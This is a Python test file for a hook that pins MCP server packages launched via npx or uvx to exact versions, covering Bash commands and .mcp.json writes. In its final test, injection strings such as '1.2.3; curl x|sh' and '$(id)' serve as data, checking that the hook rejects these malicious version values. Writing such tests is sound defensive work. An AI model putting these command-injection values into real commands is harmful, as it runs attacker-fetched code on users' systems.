from __future__ import annotations

import json

from bawwab.gate.detect import HookInput
from bawwab.gate.pin import pin_input
from bawwab.types import Target


def npm(name, version=None, raw=""):
    return Target("npm", raw, name=name, version=version)


def pypi(name, version=None, raw=""):
    return Target("pypi", raw, name=name, version=version)


def test_npx_unversioned_pinned():
    inp = HookInput("Bash", {"command": "claude mcp add gh -- npx -y @a/b", "description": "d"}, "/tmp")
    out = pin_input(inp, {npm("@a/b"): "1.4.0"})
    assert out == {"command": "claude mcp add gh -- npx -y @a/b@1.4.0", "description": "d"}


def test_uvx_pinned_only_package_occurrence():
    inp = HookInput("Bash", {"command": "claude mcp add mcp-x -- uvx mcp-x"}, "/tmp")
    out = pin_input(inp, {pypi("mcp-x"): "0.9.1"})
    assert out["command"] == "claude mcp add mcp-x -- uvx mcp-x==0.9.1"


def test_latest_pinned():
    inp = HookInput("Bash", {"command": "claude mcp add gh -- npx -y pkg@latest --flag"}, "/tmp")
    out = pin_input(inp, {npm("pkg", "latest"): "2.0.0"})
    assert out["command"] == "claude mcp add gh -- npx -y pkg@2.0.0 --flag"


def test_already_pinned_is_none():
    inp = HookInput("Bash", {"command": "claude mcp add gh -- npx -y pkg@1.0.0"}, "/tmp")
    assert pin_input(inp, {npm("pkg", "1.0.0"): "1.0.0"}) is None
    inp = HookInput("Bash", {"command": "claude mcp add gh -- uvx pkg==1.0"}, "/tmp")
    assert pin_input(inp, {pypi("pkg", "1.0"): "1.0"}) is None
    assert pin_input(inp, {}) is None


def test_write_content_rewrites_matching_server_args():
    content = json.dumps({"mcpServers": {
        "pkg": {"command": "npx", "args": ["-y", "pkg"]},
        "other": {"command": "npx", "args": ["-y", "other"]},
    }}, indent=2) + "\n"
    inp = HookInput("Write", {"file_path": "/p/.mcp.json", "content": content}, "/tmp")
    out = pin_input(inp, {npm("pkg", raw="npx -y pkg"): "3.1.0"})
    new = out["content"]
    assert json.loads(new)["mcpServers"]["pkg"]["args"] == ["-y", "pkg@3.1.0"]
    assert json.loads(new)["mcpServers"]["other"]["args"] == ["-y", "other"]
    assert new.startswith('{\n  "mcpServers"') and new.endswith("\n")


def test_write_content_project_servers():
    content = json.dumps({"projects": {"/p": {"mcpServers": {"x": {"command": "uvx", "args": ["mcp-x"]}}}}})
    inp = HookInput("Write", {"file_path": "/h/.claude.json", "content": content}, "/tmp")
    out = pin_input(inp, {pypi("mcp-x", raw="uvx mcp-x"): "1.2"})
    assert json.loads(out["content"])["projects"]["/p"]["mcpServers"]["x"]["args"] == ["mcp-x==1.2"]
    assert "\n" not in out["content"]  # compact original stays compact


def test_edit_new_string_rewritten():
    inp = HookInput("Edit", {"file_path": "/p/.mcp.json", "old_string": "{}",
                             "new_string": '{"x": {"command": "npx", "args": ["-y", "@s/x"]}}'}, "/tmp")
    out = pin_input(inp, {npm("@s/x"): "0.0.7"})
    assert out["new_string"] == '{"x": {"command": "npx", "args": ["-y", "@s/x@0.0.7"]}}'
    assert out["old_string"] == "{}"


def test_multiedit_new_strings_rewritten():
    inp = HookInput("MultiEdit", {"file_path": "/p/.mcp.json", "edits": [
        {"old_string": "a", "new_string": '"args": ["mcp-y"]'}]}, "/tmp")
    out = pin_input(inp, {pypi("mcp-y"): "4.0"})
    assert out["edits"][0]["new_string"] == '"args": ["mcp-y==4.0"]'


# ------------------------------------------------------------- fix round 1 (I6)

def test_pin_only_in_runner_segment():
    t = npm("evilpkg")
    inp = HookInput("Bash", {"command": "claude mcp add x -- npx -y evilpkg; echo evilpkg"}, "/tmp")
    assert pin_input(inp, {t: "1.2.3"})["command"] == "claude mcp add x -- npx -y evilpkg@1.2.3; echo evilpkg"
    inp = HookInput("Bash", {"command": "echo evilpkg; claude mcp add x -- npx -y evilpkg&& true"}, "/tmp")
    assert pin_input(inp, {t: "1.2.3"})["command"] == "echo evilpkg; claude mcp add x -- npx -y evilpkg@1.2.3&& true"
    inp = HookInput("Bash", {"command": "claude mcp add evilpkg -- npx -y evilpkg"}, "/tmp")
    assert pin_input(inp, {t: "1.2.3"})["command"] == "claude mcp add evilpkg -- npx -y evilpkg@1.2.3"


def test_pin_rejects_invalid_versions():
    inp = HookInput("Bash", {"command": "claude mcp add x -- npx -y evilpkg"}, "/tmp")
    for bad in ("1.2.3; curl x|sh", "$(id)", "1 2", "", "a/b"):
        assert pin_input(inp, {npm("evilpkg"): bad}) is None
    assert pin_input(inp, {npm("evilpkg"): "1.0.0-rc.1+b_2"}) is not None
